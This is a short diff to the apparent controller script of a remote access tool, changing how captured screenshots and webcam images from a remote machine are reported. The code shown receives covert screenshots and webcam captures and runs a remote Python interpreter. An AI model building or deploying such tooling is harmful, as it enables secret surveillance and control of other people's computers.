@@ -93,18 +93,18 @@ def Screenshot():
     with open("screenshot.png", "wb") as ImageFile:
         ImageFile.write(recvall(int(buffersize)))
 
-    print("\n(Screenshot Captured)\n" + f"Total Size: {str(buffersize)}\n")
+    print("\n(Screenshot Captured)\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
 
 def Webcam():
     if not (recv(1024).decode() == "success"):
         print("(No Webcam Detected)\n")
         return
 
-    buffersize = recv(1024).decode()
+    buffersize = recv(1024).decode(); Webcam_Name = recv(1024).decode()
     with open("webcam.png", "wb") as ImageFile:
         ImageFile.write(recvall(int(buffersize)))
 
-    print("\n(Screenshot Captured)\n" + f"Total Size: {str(buffersize)}\n")
+    print("\n[ Webcam Captured ]\n\n" + f"Name: ({Webcam_Name})\n" + f"Total Size: ({str(buffersize)} Bytes)\n")
 
 def SystemInformation():
     print(f"\nComputer: ({ClientInfo[1]})")
@@ -148,7 +148,7 @@ def PythonInterpreter():
         print("\n[Remote Machine Output]\n" + "-"*23 + "\n<No Output>\n")
     else:
         print("\n[Remote Machine Output]\n" + "-"*23 + f"\n{SplitOutput[0]}")
-        
+
     os.remove("code.txt")
 
 def RemoteCMD():
